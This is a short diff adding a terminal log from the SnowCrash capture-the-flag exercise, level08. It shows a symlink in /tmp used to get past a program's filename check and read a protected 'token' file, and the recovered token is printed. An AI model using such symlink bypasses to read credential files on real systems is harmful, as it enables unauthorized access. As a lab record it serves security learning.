@@ -1,0 +1,5 @@
+level08@SnowCrash:~$ ./level08 token
+You may not access 'token'
+level08@SnowCrash:~$ ln -s /home/user/level08/token /tmp/my_link
+level08@SnowCrash:~$ ./level08 /tmp/my_link
+quif5eloekouj29ke0vouxean
